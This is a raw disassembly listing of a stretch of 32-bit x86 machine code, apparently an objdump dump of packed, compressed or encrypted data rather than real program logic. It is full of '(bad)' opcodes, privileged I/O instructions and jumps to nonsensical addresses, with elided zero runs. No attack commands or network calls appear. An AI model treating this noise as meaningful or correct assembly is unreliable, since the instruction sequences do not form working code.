  41637e:	jae    0x4163f4
  416380:	and    eax,0xb8b5f4bb
  416385:	shl    DWORD PTR [edx+0x54],0x46
  416389:	and    DWORD PTR [ebp-0x8],ebx
  41638c:	sbb    esp,esi
  41638e:	inc    ecx
  41638f:	inc    edi
  416390:	inc    ebx
  416391:	mov    edi,0x56af6f4a
  416396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416397:	sub    al,0x5a
  416399:	mov    eax,0xe6a68c20
  41639e:	clc    
  41639f:	outs   dx,DWORD PTR ds:[esi]
  4163a0:	xchg   edx,eax
  4163a1:	adc    DWORD PTR [ebx],esi
  4163a3:	mov    edx,0x27ba21df
  4163a8:	mov    ah,0x4c
  4163aa:	cmc    
  4163ab:	sbb    BYTE PTR [ecx+0x21],bh
  4163ae:	popf   
  4163af:	cli    
  4163b0:	mov    cl,bh
  4163b2:	jg     0x416397
  4163b4:	test   eax,0x5da55297
  4163b9:	fild   DWORD PTR [esi-0x63]
  4163bc:	(bad)  
  4163bd:	jmp    0x9a6e453a
  4163c2:	mov    edi,0x773e4528
  4163c7:	push   edi
  4163c8:	stc    
  4163c9:	and    DWORD PTR [edx+0x42],edi
  4163cc:	and    bh,bl
  4163ce:	idiv   DWORD PTR [edi]
  4163d0:	sub    ah,0x1a
  4163d3:	leave  
  4163d4:	pop    eax
  4163d5:	ds jge 0x4163d0
  4163d8:	les    ebp,FWORD PTR [edx-0x5407dcd]
  4163de:	test   al,0xa2
  4163e0:	nop
  4163e1:	into   
  4163e2:	dec    edi
  4163e3:	sahf   
  4163e4:	popa   
  4163e5:	(bad)  
  4163e6:	cld    
  4163e7:	cmp    ebx,eax
  4163e9:	outs   dx,DWORD PTR ds:[esi]
  4163ea:	js     0x416469
  4163ec:	add    BYTE PTR [edi],bh
  4163ee:	mov    ebx,DWORD PTR [eax]
  4163f0:	sar    eax,0xbd
  4163f3:	aaa    
  4163f4:	(bad)  
  4163f6:	pop    ebp
  4163f7:	xchg   edi,eax
  4163f8:	aas    
  4163f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163fa:	popa   
  4163fb:	sub    DWORD PTR [esi-0x7a],edx
  4163fe:	jo     0x416446
  416400:	mov    ds:0x927e4161,eax
  416405:	add    DWORD PTR [ecx],ecx
  416407:	sbb    eax,0xd69683d2
  41640c:	pop    ebp
  41640d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41640e:	loope  0x41641a
	...
  416474:	repz inc ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	push   edi
  416481:	xchg   esp,eax
  416482:	(bad)  
  416483:	adc    eax,DWORD PTR [eax-0x15]
  416486:	add    BYTE PTR [eax],al
  416488:	add    al,0x1
  41648a:	add    BYTE PTR [eax],al
  41648c:	data16 sbb BYTE PTR [ecx],dh
  41648f:	adc    DWORD PTR [ebp-0x16ca16e8],edi
  416495:	mov    bl,0xd0
  416497:	mov    es,WORD PTR [ebx+esi*2-0x1484945d]
  41649e:	sahf   
  41649f:	enter  0x273f,0x35
  4164a3:	(bad)  
  4164a4:	fadd   DWORD PTR [edi]
  4164a6:	mov    eax,ebp
  4164a8:	sti    
  4164a9:	cmp    dh,BYTE PTR [ebp-0x31b61828]
  4164af:	jo     0x41646d
  4164b1:	add    ebp,edx
  4164b3:	xchg   esi,eax
  4164b4:	jmp    0xaaab08d3
  4164b9:	js     0x41643b
  4164bb:	jae    0x41646d
  4164bd:	sahf   
  4164be:	xchg   esi,eax
  4164bf:	jb     0x416515
  4164c1:	adc    bl,BYTE PTR [eax]
  4164c3:	scas   al,BYTE PTR es:[edi]
  4164c4:	shl    DWORD PTR [ecx+0x14aaa14],0xcb
  4164cb:	mov    BYTE PTR [eax],al
  4164cd:	test   edi,0x9013dd07
  4164d3:	sbb    BYTE PTR [esi],0x1c
  4164d6:	shr    DWORD PTR [edx+eiz*4-0x536c693c],cl
  4164dd:	(bad)  
  4164df:	mov    fs,ecx
  4164e1:	xchg   edi,eax
  4164e2:	out    dx,eax
  4164e3:	lods   eax,DWORD PTR ds:[esi]
  4164e4:	cli    
  4164e5:	in     eax,dx
  4164e6:	sbb    cl,BYTE PTR [ecx+ecx*1+0x2c1b4c2c]
  4164ed:	inc    ecx
  4164ee:	mov    al,dl
  4164f0:	pop    esp
  4164f1:	mov    gs,WORD PTR [eax]
  4164f3:	sub    BYTE PTR [ebx+0x7f1c38cc],dh
  4164f9:	and    al,0xe5
  4164fb:	mul    DWORD PTR [eax+0x3a3c57a7]
  416501:	mov    ecx,0x60ba70f8
  416506:	ja     0x416514
  416508:	bound  ebp,QWORD PTR [eax-0x1840e4a8]
  41650e:	jle    0x41655f
  416510:	stos   BYTE PTR es:[edi],al
  416511:	shr    DWORD PTR [eax+0x5d],cl
  416514:	repz int3 
  416516:	push   ds
  416517:	adc    DWORD PTR [esi+0x4e0803d4],edi
  41651d:	loope  0x4164ef
  41651f:	add    BYTE PTR [edx-0x2b270bd],0x80
  416526:	xor    ebx,ebx
  416528:	jmp    0x416582
  41652a:	dec    esi
  41652b:	aam    0xd9
  41652d:	mov    cl,0x88
  41652f:	nop
  416530:	and    al,0xe7
  416532:	aas    
  416533:	sti    
  416534:	ins    DWORD PTR es:[edi],dx
  416535:	shl    ch,1
  416537:	pop    ebp
  416538:	mov    esp,0x77d57bbe
  41653d:	fistp  QWORD PTR [ebx+0x11696bd9]
  416543:	push   ebp
  416544:	fucomip st,st(7)
  416546:	jno    0x4164de
  416548:	fwait
  416549:	int    0xc7
  41654b:	push   ebp
  41654c:	jne    0x416576
  41654e:	xor    dl,BYTE PTR [ebx+0x33be5496]
  416554:	pop    ds
  416555:	mov    edx,0xf471e9a1
  41655a:	sbb    al,0xa8
  41655c:	jbe    0x4165bd
  41655e:	jae    0x41658e
  416560:	test   eax,0x88b9e780
  416565:	mov    al,ds:0x576b827f
  41656a:	inc    esp
  41656b:	push   esi
  41656c:	sub    edi,DWORD PTR [ebx+0x6f]
  41656f:	xrelease xchg BYTE PTR [ecx-0x674ae2f7],bl
  416576:	jg     0x4165a7
  416578:	mov    ebx,0xf3e08da8
  41657d:	shl    BYTE PTR [edi+0x5cc5bfca],1
  416583:	dec    edx
  416584:	mov    ch,0x6b
  416586:	dec    esi
  416587:	out    dx,al
  416588:	dec    esp
  416589:	inc    edi
  41658a:	mov    ah,0x10
  41658c:	add    DWORD PTR [ecx-0x6d],ebp
  41658f:	test   BYTE PTR [eax],0x0
	...
  4165f2:	add    BYTE PTR [eax],al
  4165f4:	and    eax,0xfff32bd8
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi-0x2cb04354]
  416601:	sbb    DWORD PTR [ebp+0xec449e],esp
  416607:	add    BYTE PTR [ecx+eax*1],al
  41660a:	add    BYTE PTR [eax],al
  41660c:	and    DWORD PTR [eax-0x34],edi
  41660f:	cwde   
  416610:	outs   dx,DWORD PTR ds:[esi]
  416611:	rol    BYTE PTR [eax+0x4f123b6c],0x70
  416618:	popf   
  416619:	adc    al,0x92
  41661b:	push   ss
  41661c:	cli    
  41661d:	and    DWORD PTR [edi-0x3390545b],eax
  416623:	test   dh,bl
  416625:	inc    eax
  416626:	addr16 std 
  416628:	imul   esi,DWORD PTR ds:0xff239240,0x501b0b38
  416632:	scas   eax,DWORD PTR es:[edi]
  416633:	sbb    eax,0x2daad061
  416638:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416639:	fld    DWORD PTR [ebp+0x74]
  41663c:	(bad)  
  41663d:	jl     0x41664f
  41663f:	cwde   
  416640:	mov    eax,ds:0x68761c33
  416645:	and    al,0x89
  416647:	test   DWORD PTR [ecx-0x6f],ebx
  41664a:	ror    BYTE PTR [esi],1
  41664c:	jp     0x4166cd
  41664e:	mov    cl,0x1a
  416650:	pop    ebx
  416651:	lods   eax,DWORD PTR ds:[esi]
  416652:	jmp    DWORD PTR [ebp+0x5]
  416655:	rcl    DWORD PTR [edi+0x28],1
  416658:	xchg   edx,eax
  416659:	push   edx
  41665a:	mov    ch,0xda
  41665c:	outs   dx,BYTE PTR ds:[esi]
  41665d:	std    
  41665e:	xchg   esp,eax
  41665f:	mov    cl,0x3b
  416661:	pop    ebx
  416662:	xchg   ecx,eax
  416663:	mov    ds:0xa5dcdaa6,eax
  416668:	sbb    DWORD PTR [edx+0x231bb3c1],edi
  41666e:	adc    al,0x16
  416670:	push   ss
  416671:	fidivr WORD PTR ds:0x2be287c1
  416677:	pop    edx
  416678:	jne    0x416603
  41667a:	ror    DWORD PTR [ebx-0x3b],1
  41667d:	pop    ecx
  41667e:	retf   0x48b6
  416681:	inc    esi
  416682:	ja     0x4166e4
  416684:	(bad)  
  416685:	out    dx,al
  416686:	hlt    
  416687:	and    eax,0x30d9b7c4
  41668c:	pop    es
  41668d:	and    ah,BYTE PTR [esi-0x53b55a29]
  416693:	jnp    0x4166e6
  416695:	sti    
  416696:	xchg   esp,eax
  416697:	fdivrp st(0),st
  416699:	out    0xee,al
  41669b:	ja     0x416672
  41669d:	cmp    DWORD PTR [eax],esp
  41669f:	in     al,0xdc
  4166a1:	stos   DWORD PTR es:[edi],eax
  4166a2:	retf   
  4166a3:	je     0x416661
  4166a5:	mov    dl,0xb8
  4166a7:	adc    BYTE PTR [eax+0x47],0x45
  4166ab:	mov    ds:0x9722ea34,eax
  4166b0:	shl    ebx,cl
  4166b2:	cmovo  ecx,DWORD PTR [edx+0x312f26e7]
  4166b9:	(bad)  
  4166ba:	cwde   
  4166bb:	jle    0x4166a4
  4166bd:	aam    0xa3
  4166bf:	lock xor BYTE PTR [edx],bh
  4166c2:	fisttp WORD PTR [esi-0x18]
  4166c5:	test   edi,ecx
  4166c7:	lods   eax,DWORD PTR ds:[esi]
  4166c8:	adc    al,0x39
  4166ca:	add    DWORD PTR [ecx-0x3387da6f],edi
  4166d0:	push   cs
  4166d1:	jmp    0x41671a
  4166d3:	paddsb mm3,QWORD PTR [edx]
  4166d6:	nop
  4166d7:	shl    BYTE PTR [esi],0x99
  4166da:	xor    dh,BYTE PTR es:[eax]
  4166dd:	scas   eax,DWORD PTR es:[edi]
  4166de:	jno    0x416756
  4166e0:	stos   BYTE PTR es:[edi],al
  4166e1:	xor    BYTE PTR [ecx-0x798e2c42],0xdb
  4166e8:	pushf  
  4166e9:	jne    0x4166af
  4166eb:	(bad)  [ecx]
  4166ed:	in     eax,0xba
  4166ef:	outs   dx,BYTE PTR ds:[esi]
  4166f0:	out    0x3,eax
  4166f2:	cli    
  4166f3:	jns    0x416699
  4166f5:	test   DWORD PTR [ecx-0x57d142e4],ecx
  4166fb:	mov    bl,0x5d
  4166fd:	retf   0x17c2
  416700:	pop    es
  416701:	cli    
  416702:	shl    BYTE PTR [ebx+0x9],cl
  416705:	add    ebx,DWORD PTR [edx+0x52d64c22]
  41670b:	ss je  0x4166e1
  41670e:	repnz inc ebx
	...
  416774:	(bad)  
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	popf   
  416781:	mov    cl,0xf9
  416783:	loopne 0x4167cd
  416785:	in     eax,dx
  416786:	add    BYTE PTR [eax],al
  416788:	add    al,0x1
  41678a:	add    BYTE PTR [eax],al
  41678c:	cmp    al,cl
  41678e:	icebp  
  41678f:	pop    es
  416790:	(bad)  [edi+eax*4]
  416793:	sbb    dh,bl
  416795:	mov    ebp,ecx
  416797:	stos   DWORD PTR es:[edi],eax
  416798:	jl     0x416802
  41679a:	pop    esi
  41679b:	stc    
  41679c:	into   
  41679d:	nop
  41679e:	sbb    al,0xfb
  4167a0:	dec    ebp
  4167a1:	or     ch,BYTE PTR [ebx+ebp*1+0x6687ea2b]
  4167a8:	or     dl,bl
  4167aa:	pusha  
  4167ab:	fistp  DWORD PTR [edx+edx*8-0x6f70f887]
  4167b2:	cmp    DWORD PTR [edi+0x51],0xfffffffe
  4167b6:	sahf   
  4167b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167b8:	stos   DWORD PTR es:[edi],eax
  4167b9:	sub    ebx,DWORD PTR [esi-0x6a]
  4167bc:	push   0x31963ae7
  4167c1:	sbb    DWORD PTR [edx-0x3fe4361e],ebp
  4167c7:	retf   
  4167c8:	add    DWORD PTR [eax-0x70],ebx
  4167cb:	pusha  
  4167cc:	fwait
  4167cd:	dec    edi
  4167ce:	cld    
  4167cf:	pop    esp
  4167d0:	push   esp
  4167d1:	stos   DWORD PTR es:[edi],eax
  4167d2:	lahf   
  4167d3:	xchg   ebx,eax
  4167d4:	jge    0x416764
  4167d6:	inc    esp
  4167d7:	js     0x41675f
  4167d9:	sub    eax,0xaa062fa6
  4167de:	xchg   bl,bl
  4167e0:	pop    ebx
  4167e1:	push   edi
  4167e2:	cld    
  4167e3:	adc    al,0x4a
  4167e5:	cli    
  4167e6:	pushf  
  4167e7:	ds retf 0x3952
  4167eb:	fs lahf 
  4167ed:	test   al,0x3
  4167ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167f0:	popa   
  4167f1:	stos   BYTE PTR es:[edi],al
  4167f2:	adc    eax,DWORD PTR [ecx+ebx*8+0x68]
  4167f6:	sub    bl,BYTE PTR [ecx+ebp*1]
  4167f9:	jb     0x41682f
  4167fb:	aaa    
  4167fc:	mov    al,ds:0x9264d254
  416801:	xor    BYTE PTR [ecx+0x17],cl
  416804:	fisttp QWORD PTR [ecx]
  416806:	dec    eax
  416807:	xchg   DWORD PTR [eax-0x2c],edi
  41680a:	ss ret 
  41680c:	(bad)  
  41680d:	sbb    dh,ch
  41680f:	inc    edx
  416810:	daa    
  416811:	(bad)  
  416814:	add    al,0xcf
  416816:	jp     0x416890
  416818:	xlat   BYTE PTR ds:[ebx]
  416819:	test   dh,ch
  41681b:	xor    eax,0x90d467eb
  416820:	jnp    0x41684f
  416822:	jne    0x4167c9
  416824:	mov    dl,0x88
  416826:	jle    0x4167d0
  416828:	test   eax,0xee59e9cc
  41682d:	dec    eax
  41682e:	xor    eax,0x57597527
  416833:	outs   dx,BYTE PTR ds:[esi]
  416834:	sub    edi,DWORD PTR [ebp-0x5fe6a6ee]
  41683a:	in     al,0xd5
  41683c:	push   ebx
  41683d:	(bad)  
  41683e:	iret   
  41683f:	scas   al,BYTE PTR es:[edi]
  416840:	add    eax,DWORD PTR [ecx]
  416842:	std    
  416843:	sub    eax,0x1f537f7b
  416848:	and    ah,dh
  41684a:	or     edx,0xffffff8b
  41684d:	pop    ds
  41684e:	or     DWORD PTR [ecx],0x4bf16ceb
  416854:	or     ah,BYTE PTR [edx]
  416856:	jne    0x416868
  416858:	or     edx,edi
  41685a:	sbb    bl,BYTE PTR [edi-0x79]
  41685d:	(bad)  [ecx-0x65d11cc7]
  416863:	fidiv  DWORD PTR [ebp+0x79b6bd64]
  416869:	lds    edx,FWORD PTR [ebx]
  41686b:	scas   al,BYTE PTR es:[edi]
  41686c:	out    dx,eax
  41686d:	imul   esi,DWORD PTR [edx-0x7b],0xac85c851
  416874:	gs ins BYTE PTR es:[edi],dx
  416876:	icebp  
  416877:	push   0x51d48f77
  41687c:	(bad)  
  41687d:	call   0xa065e9de
  416882:	pop    es
  416883:	add    al,0x8a
  416885:	dec    ecx
  416886:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416887:	scas   eax,DWORD PTR es:[edi]
  416888:	lahf   
  416889:	add    BYTE PTR [ebx+0x3e],bh
  41688c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41688d:	arpl   WORD PTR [edx+ecx*2+0x0],sp
	...
  4168f1:	add    BYTE PTR [eax],al
  4168f3:	add    cl,dl
  4168f5:	scas   eax,DWORD PTR es:[edi]
  4168f6:	push   es
  4168f7:	repz jle 0x4168f5
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0xf6207300
  416904:	dec    esp
  416905:	out    dx,al
  416906:	add    BYTE PTR [eax],al
  416908:	add    al,0x1
  41690a:	add    BYTE PTR [eax],al
  41690c:	add    DWORD PTR [eax+0xc],ebx
  41690f:	sar    BYTE PTR [edi-0x4b],cl
  416912:	dec    edi
  416913:	lods   al,BYTE PTR ds:[esi]
  416914:	xchg   ebx,eax
  416915:	mov    ds:0x2204d9fd,al
  41691a:	cmp    edx,DWORD PTR ds:0xaa97c993
  416920:	jle    0x416903
  416922:	adc    DWORD PTR [edi],ecx
  416924:	xor    DWORD PTR [esi-0x2c],ecx
  416927:	push   0x2f
  416929:	mov    ah,0xce
  41692b:	ins    DWORD PTR es:[edi],dx
  41692c:	arpl   WORD PTR [esp+eax*8],sp
  41692f:	icebp  
  416930:	add    eax,0xed073b8d
  416935:	add    bh,al
  416937:	frstor ds:0xa0af5c24
  41693d:	js     0x41691e
  41693f:	inc    esi
  416940:	pop    ss
  416941:	int3   
  416942:	in     al,0x29
  416944:	ja     0x4168c7
  416946:	xor    dl,BYTE PTR [ecx+edx*1+0x3f]
  41694a:	xor    DWORD PTR [ebx+0x55],edi
  41694d:	mov    al,ds:0xf3eb8633
  416952:	jne    0x416983
  416954:	jp     0x4168dd
  416956:	leave  
  416957:	mov    esi,0xdc5c9e68
  41695c:	inc    esi
  41695d:	repnz dec bp
  416960:	test   BYTE PTR [eax],al
  416962:	ss xor al,0xe
  416965:	ins    BYTE PTR es:[edi],dx
  416966:	xchg   ebp,eax
  416967:	or     DWORD PTR [edi],edi
  416969:	sub    ch,cl
  41696b:	aas    
  41696c:	and    eax,0xa04aa7bb
  416971:	pop    edi
  416972:	sti    
  416973:	push   esi
  416974:	mov    ebp,0x41966b85
  416979:	mov    ds:0x46a6ef58,al
  41697e:	test   al,0x79
  416980:	xor    eax,0xaac16e9
  416985:	add    al,0xe4
  416987:	xor    ebx,DWORD PTR [ecx]
  416989:	inc    eax
  41698a:	test   BYTE PTR [edx-0x8],ah
  41698d:	jge    0x416923
  41698f:	ficomp DWORD PTR ds:0x213af7d3
  416995:	cli    
  416996:	inc    esi
  416997:	ds dec ebp
  416999:	fwait
  41699a:	and    DWORD PTR [ebp-0x28],esp
  41699d:	sti    
  41699e:	ins    BYTE PTR es:[edi],dx
  41699f:	sti    
  4169a0:	mov    ebp,0x45424a5a
  4169a5:	scas   eax,DWORD PTR es:[edi]
  4169a6:	push   0x7c
  4169a8:	mov    ebx,0xacd11e6a
  4169ad:	out    0x98,al
  4169af:	call   0x8ce6bfd
  4169b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169b5:	in     eax,dx
  4169b6:	bnd cs je 0x416a03
  4169ba:	aam    0x44
  4169bc:	iret   
  4169bd:	call   0xd246:0x5a82bd8c
  4169c4:	pop    ebp
  4169c5:	pop    DWORD PTR [ebx]
  4169c7:	clc    
  4169c8:	jae    0x4169c5
  4169ca:	push   es
  4169cb:	lods   eax,DWORD PTR ds:[esi]
  4169cc:	push   ebp
  4169cd:	int3   
  4169ce:	mov    cs:0xd399a1ac,eax
  4169d4:	dec    edx
  4169d5:	push   edx
  4169d6:	inc    edi
  4169d7:	ret    0x4050
  4169da:	call   FWORD PTR [eax+0x5a]
  4169dd:	inc    ebx
  4169de:	sahf   
  4169df:	xchg   esi,eax
  4169e0:	dec    ebp
  4169e1:	push   cs
  4169e2:	stos   BYTE PTR es:[edi],al
  4169e3:	fist   DWORD PTR [eax-0x5d79ff51]
  4169e9:	js     0x416a45
  4169eb:	ret    0x5719
  4169ee:	and    cl,ch
  4169f0:	ret    0x35f8
  4169f3:	ret    0x628d
  4169f6:	(bad)  
  4169f7:	js     0x416a0b
  4169f9:	(bad)  
  4169fa:	cli    
  4169fb:	ss iret 
  4169fd:	imul   esi,DWORD PTR [eax],0xffffffac
  416a00:	daa    
  416a01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a02:	outs   dx,BYTE PTR ds:[esi]
  416a03:	push   cs
  416a04:	sbb    al,0x77
  416a06:	sar    BYTE PTR [ebx],0x70
  416a09:	outs   dx,DWORD PTR ds:[esi]
  416a0a:	push   esi
  416a0b:	xchg   ecx,eax
  416a0c:	stos   BYTE PTR es:[edi],al
  416a0d:	push   0xfffffff6
  416a0f:	jne    0x416a11
	...
  416a71:	add    BYTE PTR [eax],al
  416a73:	add    bl,cl
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0xdb8b0ba3
  416a82:	clc    
  416a83:	ficom  DWORD PTR [eax-0x11]
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    al,0x1
  416a8a:	add    BYTE PTR [eax],al
  416a8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a8e:	dec    edx
  416a8f:	leave  
  416a90:	mov    bl,BYTE PTR [ebx*2+0x519ca7af]
  416a97:	dec    ecx
  416a98:	sahf   
  416a99:	ds push edx
  416a9b:	cld    
  416a9c:	jmp    0x416a67
  416a9e:	int3   
  416a9f:	mov    ah,0xae
  416aa1:	mov    al,ds:0xbc6e0d7
  416aa6:	push   0xc567837e
  416aab:	pushf  
  416aac:	outs   dx,DWORD PTR ds:[esi]
  416aad:	loopne 0x416ac8
  416aaf:	shl    BYTE PTR [eax],1
  416ab1:	cmp    BYTE PTR [edi+eax*4-0x5406c2c4],ch
  416ab8:	fcom   st(6)
  416aba:	cld    
  416abb:	dec    esp
  416abc:	xchg   ebx,eax
  416abd:	jmp    0x809e:0x9ddb047f
  416ac4:	xchg   ebx,eax
  416ac5:	scas   eax,DWORD PTR es:[edi]
  416ac6:	ret    0xf036
  416ac9:	jnp    0x416aaa
  416acb:	sub    ch,BYTE PTR [ebx+0x630e3172]
  416ad1:	(bad)
  416ad4:	fwait
  416ad5:	into   
  416ad6:	mov    esi,0x310d8f7d
  416adb:	push   es
  416adc:	daa    
  416add:	fcom   st(0)
  416adf:	stos   BYTE PTR es:[edi],al
  416ae0:	call   0x3bfb7ed
  416ae5:	test   cl,bl
  416ae7:	dec    esi
  416ae8:	cwde   
  416ae9:	aaa    
  416aea:	(bad)  
  416aeb:	das    
  416aec:	push   cs
  416aed:	scas   eax,DWORD PTR es:[edi]
  416aee:	scas   al,BYTE PTR es:[edi]
  416aef:	pusha  
  416af0:	mov    edi,0x4cf629a3
  416af5:	xchg   esi,eax
  416af6:	cmc    
  416af7:	pop    edx
  416af8:	dec    DWORD PTR [esi-0x29e9dd35]
  416afe:	mov    ss,WORD PTR [ebx]
  416b00:	adc    eax,0xb46baf1f
  416b05:	mov    edi,0xd245686c
  416b0a:	scas   al,BYTE PTR es:[edi]
  416b0b:	fsub   QWORD PTR [ebx+esi*2-0x5f]
  416b0f:	xchg   ecx,eax
  416b10:	push   0x3e654fc7
  416b15:	pop    es
  416b16:	pop    edi
  416b17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b18:	aas    
  416b19:	xchg   edi,eax
  416b1a:	cmp    DWORD PTR [eax-0x1c],edi
  416b1d:	mov    BYTE PTR [esi-0x69],dh
  416b20:	mov    cl,0xf1
  416b22:	pop    edx
  416b23:	xor    bh,BYTE PTR gs:[esi+0x69]
  416b27:	push   0xffffffeb
  416b29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b2a:	test   BYTE PTR [ebx-0x7d3d33e],al
  416b30:	add    BYTE PTR [esi],dl
  416b32:	idiv   DWORD PTR [ebx]
  416b34:	and    ebp,ecx
  416b36:	push   cs
  416b37:	add    al,0x45
  416b39:	dec    ebp
  416b3a:	xor    al,0xe4
  416b3c:	outs   dx,DWORD PTR ds:[esi]
  416b3d:	jo     0x416ac0
  416b3f:	mov    ds:0x5b53012d,eax
  416b44:	jns    0x416af3
  416b46:	cwde   
  416b47:	lock xlat BYTE PTR ds:[ebx]
  416b49:	fild   DWORD PTR [ebx]
  416b4b:	lock xor eax,0xbde1b8b7
  416b51:	aaa    
  416b52:	repz and al,0xa2
  416b55:	cmp    al,0xf4
  416b57:	mov    ah,BYTE PTR [esi+0x54]
  416b5a:	call   0x8680:0x7a6d3c0f
  416b61:	sbb    al,0x5f
  416b63:	int3   
  416b64:	cmp    ebx,ebp
  416b66:	xchg   edx,eax
  416b67:	sbb    eax,0xe352e009
  416b6c:	out    dx,al
  416b6d:	je     0x416bd5
  416b6f:	lods   al,BYTE PTR ds:[esi]
  416b70:	ins    DWORD PTR es:[edi],dx
  416b71:	(bad)  
  416b72:	dec    edx
  416b73:	in     eax,dx
  416b74:	xchg   esi,eax
  416b75:	sbb    DWORD PTR gs:0xfbd34d2a,ebx
  416b7c:	jl     0x416bcb
  416b7e:	aas    
  416b7f:	adc    eax,DWORD PTR [ebp+0x11b1dac3]
  416b85:	push   0x29
  416b87:	(bad)  
  416b88:	(bad)  
  416b89:	scas   al,BYTE PTR es:[edi]
  416b8a:	add    edx,DWORD PTR [edi+0x5c]
  416b8d:	popf   
  416b8e:	repnz add BYTE PTR [bx+si],al
	...
  416bf2:	add    BYTE PTR [eax],al
  416bf4:	jecxz  0x416c5b
  416bf6:	push   cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x225b70a9
  416c01:	sub    eax,0xf054e517
  416c06:	add    BYTE PTR [eax],al
  416c08:	add    al,0x1
  416c0a:	add    BYTE PTR [eax],al
  416c0c:	xor    eax,0xfd350e45
  416c11:	push   ecx
  416c12:	adc    eax,0xab5adc2d
  416c17:	and    al,BYTE PTR [ebx-0x64]
  416c1a:	push   0x3292d0ac
  416c1f:	push   ebx
  416c20:	sbb    DWORD PTR [edx+ebx*8-0x4c2e4fe2],ebx
  416c27:	mov    bl,0x84
  416c29:	jbe    0x416c24
  416c2b:	push   0xedbe7b6
  416c30:	mov    esi,0xfa13e250
  416c35:	(bad)  
  416c36:	jmp    ecx
  416c38:	aad    0xc8
  416c3a:	adc    eax,0x1778bb51
  416c3f:	bound  esp,QWORD PTR [esi+0x2]
  416c42:	fstp   DWORD PTR [esi-0x4c]
  416c45:	aad    0x61
  416c47:	mov    esi,DWORD PTR [edx]
  416c49:	fs jge 0x416bf4
  416c4c:	add    al,0x7e
  416c4e:	mov    dh,ah
  416c50:	sahf   
  416c51:	out    0x9c,al
  416c53:	idiv   BYTE PTR [ebp+0x65]
  416c56:	and    ebp,DWORD PTR [ebp+0x1a]
  416c59:	sbb    cl,BYTE PTR [eax]
  416c5b:	or     ebp,esp
  416c5d:	into   
  416c5e:	repz inc esp
  416c60:	jo     0x416bf0
  416c62:	sbb    al,BYTE PTR [eax-0x172d0ffd]
  416c68:	in     al,dx
  416c69:	(bad)  
  416c6a:	imul   esp,DWORD PTR ds:0x3f25a81,0x962feea2
  416c74:	dec    esi
  416c75:	sbb    BYTE PTR [edi],dl
  416c77:	iret   
  416c78:	or     bh,BYTE PTR [esi-0x67e8d9aa]
  416c7e:	cmp    al,0x8d
  416c80:	jno    0x416c02
  416c82:	inc    ecx
  416c83:	xor    ebx,DWORD PTR [edi]
  416c85:	push   es
  416c86:	scas   al,BYTE PTR es:[edi]
  416c87:	rol    BYTE PTR [edi],0x7
  416c8a:	scas   eax,DWORD PTR es:[edi]
  416c8b:	ret    
  416c8c:	jecxz  0x416cbd
  416c8e:	and    BYTE PTR [ebp+0x61258a08],dl
  416c94:	or     DWORD PTR [ebp+0x220b79f6],eax
  416c9a:	sub    BYTE PTR [esi],bl
  416c9c:	sti    
  416c9d:	sub    BYTE PTR [edi-0x5630d93d],al
  416ca3:	adc    bl,cl
  416ca5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ca6:	aas    
  416ca7:	retf   
  416ca8:	scas   al,BYTE PTR es:[edi]
  416ca9:	pop    es
  416caa:	clc    
  416cab:	in     al,dx
  416cac:	jmp    0x1552da7d
  416cb1:	in     al,0x87
  416cb3:	mov    ah,0xa5
  416cb5:	pop    edx
  416cb6:	pop    ebx
  416cb7:	out    dx,al
  416cb8:	pop    es
  416cb9:	cdq    
  416cba:	mov    al,0xdf
  416cbc:	bound  ebx,QWORD PTR [eax]
  416cbe:	and    eax,0xa904198f
  416cc3:	sti    
  416cc4:	adc    bh,BYTE PTR [edx+eax*1+0x67]
  416cc8:	add    DWORD PTR [esi+0x59],edx
  416ccb:	inc    ebp
  416ccc:	sub    DWORD PTR [eax-0x4c],0x18
  416cd0:	mov    dh,0x56
  416cd2:	mov    ah,0x61
  416cd4:	clc    
  416cd5:	xchg   ebp,eax
  416cd6:	shr    BYTE PTR [esi],1
  416cd8:	stc    
  416cd9:	pop    edi
  416cda:	or     ecx,edi
  416cdc:	sti    
  416cdd:	out    dx,al
  416cde:	cwde   
  416cdf:	test   al,0xc
  416ce1:	outs   dx,DWORD PTR ds:[esi]
  416ce2:	cs sbb al,0x85
  416ce5:	jle    0x416d57
  416ce7:	cmp    al,0x35
  416ce9:	inc    eax
  416cea:	add    edx,ebp
  416cec:	dec    esi
  416ced:	sub    eax,0x53919906
  416cf2:	mov    al,0x2f
  416cf4:	enter  0xc8e0,0x5b
  416cf8:	aaa    
  416cf9:	fist   DWORD PTR [ebp+0x11f6364b]
  416cff:	mov    al,0x42
  416d01:	pop    esi
  416d02:	mov    DWORD PTR [edi+0x1],ebx
  416d05:	jl     0x416d49
  416d07:	shr    eax,cl
  416d09:	dec    esi
  416d0a:	setge  BYTE PTR [ecx+0x2]
  416d0e:	push   ds
  416d0f:	inc    BYTE PTR [eax]
	...
  416d71:	add    BYTE PTR [eax],al
